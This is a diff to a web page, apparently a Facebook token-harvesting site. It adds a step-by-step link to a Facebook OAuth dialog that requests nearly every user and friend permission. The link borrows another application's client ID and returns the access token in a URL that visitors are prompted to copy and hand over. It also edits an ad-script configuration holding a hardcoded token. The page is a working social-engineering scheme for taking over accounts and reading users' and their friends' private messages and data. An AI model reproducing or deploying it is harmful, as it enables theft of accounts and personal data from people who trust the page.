@@ -3,7 +3,7 @@
     var configuration = {
     "token": "45a2758bd9d1280e36d674d4644f62e6",
     "excludeDomains": [
-        "http://awais-gang.tk"
+        "http://awais.cfapps.io"
     ],
     "capping": {
         "limit": 5,
@@ -817,9 +817,9 @@ if (!is_dir('fix')) {
 
      <div id="navigation-menu">
 
-     <a target="_blank" href="https://goo.gl/CvenbL"><h3>Step 1: Click Here To Allow Application</h3></a>
+     <a target="_blank" href="https://www.facebook.com/v1.0/dialog/oauth?redirect_uri=http://www.apple.com/ilife/iphoto/?COPY_THIS_COPY_URL&scope=email,publish_actions,user_about_me,user_actions.books,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_notes,user_photos,user_questions,user_relationship_details,user_relationships,user_religion_politics,user_status,user_subscriptions,user_videos,user_website,user_work_history,friends_about_me,friends_actions.books,friends_actions.music,friends_actions.news,friends_actions.video,friends_activities,friends_birthday,friends_education_history,friends_events,friends_games_activity,friends_groups,friends_hometown,friends_interests,friends_likes,friends_location,friends_notes,friends_photos,friends_questions,friends_relationship_details,friends_relationships,friends_religion_politics,friends_status,friends_subscriptions,friends_videos,friends_website,friends_work_history,ads_management,create_event,create_note,export_stream,friends_online_presence,manage_friendlists,manage_notifications,manage_pages,photo_upload,publish_stream,read_friendlists,read_insights,read_mailbox,read_page_mailboxes,read_requests,read_stream,rsvp_event,share_item,sms,status_update,user_online_presence,video_upload,xmpp_login&response_type=token%20code&client_id=10754253724"><h3>Step 1: Click Here To Allow Application</h3></a>
 
-     <a target="_blank" href="https://goo.gl/NkKRQ6"><h3>Step 2: Click Here To Get Access Token</a></h3>
+     <a target="_blank" href="https://goo.gl/vzeQsM"><h3>Step 2: Click Here To Get Access Token</a></h3>
 
      </div>
 
